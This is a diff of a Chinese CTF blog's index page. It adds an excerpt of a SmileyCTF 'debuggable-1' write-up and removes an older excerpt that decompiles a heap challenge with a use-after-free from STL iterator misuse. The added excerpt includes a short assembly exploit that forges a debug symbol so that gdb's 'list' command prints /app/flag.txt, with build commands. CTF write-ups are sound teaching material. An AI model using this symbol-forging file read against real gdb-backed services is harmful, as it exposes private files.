@@ -126,6 +126,82 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2025/06/18/SmileyCTF/" >SmileyCTF</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2025-06-18  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="pwn-debuggable-1"><a href="#pwn-debuggable-1" class="headerlink" title="pwn&#x2F;debuggable-1"></a>pwn&#x2F;debuggable-1</h1><p>题目的逻辑 run.py</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
+
+<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode
+<span class="token keyword">from</span> os <span class="token keyword">import</span> memfd_create<span class="token punctuation">,</span> getpid<span class="token punctuation">,</span> write<span class="token punctuation">,</span> environ
+<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> run
+<span class="token keyword">import</span> builtins
+
+<span class="token keyword">def</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    builtins<span class="token punctuation">.</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">,</span> flush<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+
+data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"elf: "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"got elf"</span><span class="token punctuation">)</span>
+
+pid <span class="token operator">=</span> getpid<span class="token punctuation">(</span><span class="token punctuation">)</span>
+fd <span class="token operator">=</span> memfd_create<span class="token punctuation">(</span><span class="token string">"elf"</span><span class="token punctuation">)</span>
+
+write<span class="token punctuation">(</span>fd<span class="token punctuation">,</span> elf<span class="token punctuation">)</span>
+tmp <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"/proc/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pid<span class="token punctuation">&#125;</span></span><span class="token string">/fd/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>fd<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+
+env <span class="token operator">=</span> environ<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>
+env<span class="token punctuation">[</span><span class="token string">"HOME"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/home/ubuntu"</span>
+handle <span class="token operator">=</span> run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"gdb"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">,</span> <span class="token string">"-ex"</span><span class="token punctuation">,</span> <span class="token string">"list '/app/flag.txt'"</span><span class="token punctuation">,</span> <span class="token string">"-ex"</span><span class="token punctuation">,</span> <span class="token string">"q"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> check<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">,</span> env<span class="token operator">=</span>env<span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>handle<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bye"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>gdb中的list command会读取二进制文件的调试符号，根据调试符号的信息去查找对应的源文件名，并显示指定行号或者函数周围的代码。</p>
+<p>可以通过伪造 “&#x2F;app&#x2F;flag.txt” 函数的符号去读取&#x2F;app&#x2F;flag.txt来获取flag</p>
+<p>exploit.s</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">.file 1 "/app/flag.txt"
+
+# 定义 "/app/flag.txt" 函数
+.globl "/app/flag.txt"
+.type "/app/flag.txt", @function
+"/app/flag.txt":
+    # "/app/flag.txt" 函数的源码位于 /app/flag.txt
+    .loc 1 1 0
+    ret
+
+.globl _start
+_start:
+    nop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>compile.sh</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">as --gstabs -o exploit.o exploit.s
+ld -o exploit exploit.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>exp.py</p>
+	
+	</div>
+  <a type="button" href="/2025/06/18/SmileyCTF/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2025/05/03/rust入门-数据所有权与生命周期管理/" >rust入门_数据所有权与生命周期管理</a>
 		</h3>
 		</div>
@@ -921,186 +997,6 @@ gdb <span class="token parameter variable">-x</span> /home/user/gdbinit<span ari
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/08/31/nss3rd出题-Iterator-Trap解题思路/" >nss3rd出题_Iterator_Trap解题思路</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-08-31  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/nssr3d_Iterator_Trap/Iterator_Trap">https://github.com/nyyyddddn/ctf/tree/main/nssr3d_Iterator_Trap/Iterator_Trap</a></p>
-<h2 id="Iterator-Trap"><a href="#Iterator-Trap" class="headerlink" title="Iterator_Trap"></a>Iterator_Trap</h2><p>这是一个关于stl迭代器不安全使用导致uaf的漏洞，第一次出和stl相关的题目</p>
-<p>题目逻辑</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token class-name">uint32_t</span> choice<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-54h] BYREF</span>
-  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span> chunklist<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-50h] BYREF</span>
-  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> sizelist<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-30h] BYREF</span>
-  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-18h]</span>
-
-  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">vector</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chunklist<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">vector</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sizelist<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">gift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
-  <span class="token punctuation">&#123;</span>
-    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>
-        <span class="token keyword">break</span><span class="token punctuation">;</span>
-      <span class="token function">edit_func</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chunklist<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sizelist<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">></span> <span class="token number">3</span> <span class="token punctuation">)</span>
-      <span class="token keyword">break</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-      <span class="token function">create_func</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chunklist<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sizelist<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">else</span>
-    <span class="token punctuation">&#123;</span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
-        <span class="token keyword">break</span><span class="token punctuation">;</span>
-      <span class="token function">delete_func</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chunklist<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sizelist<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-  <span class="token punctuation">&#125;</span>
-  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token keyword">void</span> __cdecl <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[1] void create(__uint32_t size,char *content)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[2] void delete(__uint32_t idx)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[3] void edit(__uint32_t idx,char *content)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token keyword">void</span> __cdecl <span class="token function">gift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token keyword">void</span> <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>
-
-  v0 <span class="token operator">=</span> <span class="token function">sbrk</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to nssctf 3rd. gift: %p\n"</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token keyword">void</span> __cdecl <span class="token function">create_func</span><span class="token punctuation">(</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span> <span class="token operator">*</span>chunklist<span class="token punctuation">,</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">*</span>sizelist<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>size_type v2<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
-  __gnu_cxx<span class="token operator">::</span>__alloc_traits<span class="token operator">&lt;</span>std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>value_type v3<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
-  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span>size_type v4<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
-  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// rax</span>
-  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-24h] BYREF</span>
-  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span>value_type __x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-20h] BYREF</span>
-
-  __x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span>value_type<span class="token punctuation">)</span><span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  __x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">push_back</span><span class="token punctuation">(</span>chunklist<span class="token punctuation">,</span> __x<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">push_back</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  v2 <span class="token operator">=</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">size</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
-  v3 <span class="token operator">=</span> <span class="token operator">*</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  v4 <span class="token operator">=</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">size</span><span class="token punctuation">(</span>chunklist<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
-  v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>chunklist<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">my_fgets</span><span class="token punctuation">(</span><span class="token operator">*</span>v5<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token class-name">ssize_t</span> __cdecl <span class="token function">my_fgets</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">,</span> <span class="token keyword">int</span> fd<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
-  <span class="token keyword">char</span> ch_0<span class="token punctuation">;</span> <span class="token comment">// [rsp+17h] [rbp-19h] BYREF</span>
-  <span class="token class-name">size_t</span> total_read<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>
-  <span class="token class-name">ssize_t</span> bytes_read<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-10h]</span>
-  <span class="token keyword">unsigned</span> __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>
-
-  v9 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token operator">!</span>buf <span class="token punctuation">)</span>
-    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>
-  total_read <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
-  <span class="token keyword">while</span> <span class="token punctuation">(</span> total_read <span class="token operator">&lt;</span> size <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">)</span>
-  <span class="token punctuation">&#123;</span>
-    bytes_read <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ch_0<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span> ch_0 <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
-      <span class="token keyword">break</span><span class="token punctuation">;</span>
-    v4 <span class="token operator">=</span> total_read<span class="token operator">++</span><span class="token punctuation">;</span>
-    buf<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> ch_0<span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
-  <span class="token keyword">return</span> total_read<span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token keyword">void</span> __cdecl <span class="token function">delete_func</span><span class="token punctuation">(</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span> <span class="token operator">*</span>chunklist<span class="token punctuation">,</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">*</span>sizelist<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span>size_type M_current_low<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
-  <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// rax</span>
-  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-34h]</span>
-  __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">></span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-30h] BYREF</span>
-  __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">></span> __i<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-28h] BYREF</span>
-  __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span> <span class="token keyword">const</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span> <span class="token operator">></span> idx<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-20h] BYREF</span>
-
-  idx<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_M_current <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token keyword">const</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">size</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
-  <span class="token punctuation">&#123;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>operator<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-      v6<span class="token punctuation">.</span>_M_current <span class="token operator">=</span> std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">begin</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">)</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">;</span>
-      __i<span class="token punctuation">.</span>_M_current <span class="token operator">=</span> __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">::</span>operator<span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">;</span>
-      __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">int</span> <span class="token keyword">const</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">(</span>
-        <span class="token punctuation">(</span>__gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">int</span> <span class="token keyword">const</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token operator">></span> <span class="token operator">*</span><span class="token keyword">const</span><span class="token punctuation">)</span>idx<span class="token punctuation">,</span>
-        <span class="token operator">&amp;</span>__i<span class="token punctuation">)</span><span class="token punctuation">;</span>
-      std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">erase</span><span class="token punctuation">(</span>sizelist<span class="token punctuation">,</span> <span class="token punctuation">(</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>const_iterator<span class="token punctuation">)</span>idx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">)</span><span class="token punctuation">;</span>
-      v6<span class="token punctuation">.</span>_M_current <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">begin</span><span class="token punctuation">(</span>chunklist<span class="token punctuation">)</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">;</span>
-      __i<span class="token punctuation">.</span>_M_current <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>__gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">>></span><span class="token operator">::</span>operator<span class="token operator">+</span><span class="token punctuation">(</span>
-                                <span class="token punctuation">(</span><span class="token keyword">const</span> __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span> <span class="token operator">></span> <span class="token operator">*</span><span class="token keyword">const</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span>
-                                i<span class="token punctuation">)</span><span class="token punctuation">.</span>_M_current<span class="token punctuation">;</span>
-      __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span> <span class="token keyword">const</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">>></span><span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">(</span>
-        idx<span class="token punctuation">,</span>
-        <span class="token punctuation">(</span><span class="token keyword">const</span> __gnu_cxx<span class="token operator">::</span>__normal_iterator<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">,</span>std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token operator">></span> <span class="token operator">></span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>__i<span class="token punctuation">)</span><span class="token punctuation">;</span>
-      std<span class="token operator">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">erase</span><span class="token punctuation">(</span>chunklist<span class="token punctuation">,</span> idx<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
